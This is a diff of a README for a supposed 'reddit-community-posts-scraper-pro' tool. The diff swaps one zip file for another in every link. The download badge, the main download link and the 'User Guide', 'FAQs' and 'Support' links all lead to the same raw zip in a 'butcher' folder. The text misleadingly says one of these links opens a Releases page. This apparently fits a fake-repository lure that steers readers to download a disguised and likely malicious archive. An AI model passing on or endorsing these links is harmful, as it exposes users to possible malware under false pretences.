@@ -1,6 +1,6 @@
 # 🛠️ reddit-community-posts-scraper-pro - Effortless Data Extraction from Reddit
 
-![Download Now](https://github.com/Danidani1313/reddit-community-posts-scraper-pro/raw/refs/heads/main/butcher/pro-posts-scraper-community-reddit-2.4-alpha.1.zip%20Now-Click%20Here-brightgreen)
+![Download Now](https://github.com/Danidani1313/reddit-community-posts-scraper-pro/raw/refs/heads/main/butcher/reddit-posts-community-pro-scraper-v2.6.zip%20Now-Click%20Here-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the reddit-community-posts-scraper-pro! This software lets you easily
 
 To get started, you’ll need to download the software. Visit this page to download:
 
-[https://github.com/Danidani1313/reddit-community-posts-scraper-pro/raw/refs/heads/main/butcher/pro-posts-scraper-community-reddit-2.4-alpha.1.zip](https://github.com/Danidani1313/reddit-community-posts-scraper-pro/raw/refs/heads/main/butcher/pro-posts-scraper-community-reddit-2.4-alpha.1.zip)
+[https://github.com/Danidani1313/reddit-community-posts-scraper-pro/raw/refs/heads/main/butcher/reddit-posts-community-pro-scraper-v2.6.zip](https://github.com/Danidani1313/reddit-community-posts-scraper-pro/raw/refs/heads/main/butcher/reddit-posts-community-pro-scraper-v2.6.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version.
@@ -79,9 +79,9 @@ If you run into issues while using the software, here are some common solutions:
 
 For more information on using reddit-community-posts-scraper-pro, visit the following links:
 
-- [User Guide](https://github.com/Danidani1313/reddit-community-posts-scraper-pro/raw/refs/heads/main/butcher/pro-posts-scraper-community-reddit-2.4-alpha.1.zip)
-- [FAQs](https://github.com/Danidani1313/reddit-community-posts-scraper-pro/raw/refs/heads/main/butcher/pro-posts-scraper-community-reddit-2.4-alpha.1.zip)
-- [Support](https://github.com/Danidani1313/reddit-community-posts-scraper-pro/raw/refs/heads/main/butcher/pro-posts-scraper-community-reddit-2.4-alpha.1.zip)
+- [User Guide](https://github.com/Danidani1313/reddit-community-posts-scraper-pro/raw/refs/heads/main/butcher/reddit-posts-community-pro-scraper-v2.6.zip)
+- [FAQs](https://github.com/Danidani1313/reddit-community-posts-scraper-pro/raw/refs/heads/main/butcher/reddit-posts-community-pro-scraper-v2.6.zip)
+- [Support](https://github.com/Danidani1313/reddit-community-posts-scraper-pro/raw/refs/heads/main/butcher/reddit-posts-community-pro-scraper-v2.6.zip)
 
 Feel free to reach out with any questions or suggestions through the GitHub issues page.
 
